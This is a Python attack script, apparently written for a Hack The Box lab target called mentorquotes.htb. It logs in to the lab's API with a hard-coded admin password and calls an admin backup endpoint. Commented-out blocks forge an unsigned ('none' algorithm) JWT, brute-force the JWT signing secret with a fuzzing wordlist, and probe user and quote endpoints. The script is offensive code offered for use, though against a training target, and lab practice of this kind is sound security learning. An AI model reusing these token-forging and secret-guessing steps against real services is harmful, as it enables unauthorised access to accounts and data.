import sys
import jwt
import requests
from requests_toolbelt.utils import dump

RHOST = 'http://api.mentorquotes.htb'
WORDLIST = '/usr/share/seclists/Fuzzing/command-injection-commix.txt'

# Register new user
# data = {
#     'email': 'dedsec@mentorquotes.htb',
#     'username': 'james',
#     'password': '12345678'
# }
# r = requests.post(RHOST + '/auth/signup/', json=data)
# print(dump.dump_all(r).decode('utf-8'))

# Login as admin
data = {
    'email': 'james@mentorquotes.htb',
    'username': 'james',
    'password': 'kj23sadkj123as0-d213'
}
r = requests.post(RHOST + '/auth/login/', json=data)
# print(dump.dump_all(r).decode('utf-8'))
if r.status_code != 200:
    sys.exit('[!] Unable to login')
token = r.text.strip('"')
# print(token)
headers = {
    'Authorization': token
}

# Admin endpoint
# r = requests.get(RHOST + '/admin/', headers=headers)
# print(dump.dump_all(r).decode('utf-8'))

# /check
# r = requests.get(RHOST + '/admin/check', headers=headers)
# print(dump.dump_all(r).decode('utf-8'))

# /check
r = requests.get(RHOST + '/admin/backup', headers=headers)
print(dump.dump_all(r).decode('utf-8'))

# Get login token of new user
# data = {
#     'email': 'john@mentorquotes.htb',
#     'username': 'johnny',
#     'password': 'johnjohn'
# }
# r = requests.post(RHOST + '/auth/login', json=data)
# print(dump.dump_all(r).decode('utf-8'))
# if r.status_code != 200:
#     sys.exit('[!] Unable to login')
# token = r.text.strip('"')
# headers = {
#     'Authorization': token
# }

# Create None JWT token
# token = jwt.encode({"username":"james","email":"james@mentorquotes.htb"}, '', 'none')
# new_payload = jwt.encode({"username":"james","email":"james@mentorquotes.htb"}, 'a', 'HS256').split('.')[1]
# token = token.split('.')[0] + '.' + new_payload + '.' + token.split('.')[2]
# print(token)
# headers = {
#     'Authorization': token
# }

# Fuzzing authorization header
# with open(WORDLIST) as wlist:
#     for w in wlist:
#         w = w.strip()
#         token = jwt.encode({"username":"james","email":"james@mentorquotes.htb"}, w, 'HS256')
#         # print(token)
#         headers = {
#             'Authorization': token
#         }
#
#         r = requests.get(RHOST + '/users/0/', headers=headers)
#         print('{}: {}'.format(r.status_code, w))
#         if r.text != 'Internal Server Error':
#             print(r.text)

# Query users
# r = requests.get(RHOST + '/users/', headers=headers)
# print(dump.dump_all(r).decode('utf-8'))

# Post new user
# data = {
#     'email': 'user@example.com',
#     'username': 'string',
#     'password': 'stringst'
# }
# r = requests.post(RHOST + '/users/add', headers=headers)
# print(dump.dump_all(r).decode('utf-8'))

# Query quotes
# r = requests.get(RHOST + '/quotes/1/', headers=headers)
# print(dump.dump_all(r).decode('utf-8'))

# Post new quote
# data = {
#     'title': 'string',
#     'description': 'string'
# }
# r = requests.post(RHOST + '/quotes/', headers=headers)
# print(dump.dump_all(r).decode('utf-8'))

# Update quote
# data = {
#     'title': 'string',
#     'description': 'string'
# }
# r = requests.put(RHOST + '/quotes/1/', headers=headers)
# print(dump.dump_all(r).decode('utf-8'))

# Delete quote
# data = {
#     'title': 'string',
#     'description': 'string'
# }
# r = requests.delete(RHOST + '/quotes/1/', headers=headers)
# print(dump.dump_all(r).decode('utf-8'))

# Non existent endpoint
# data = {
#     'title': 'string',
#     'description': 'string'
# }
# r = requests.post(RHOST + '/abc/', headers=headers)
# print(dump.dump_all(r).decode('utf-8'))
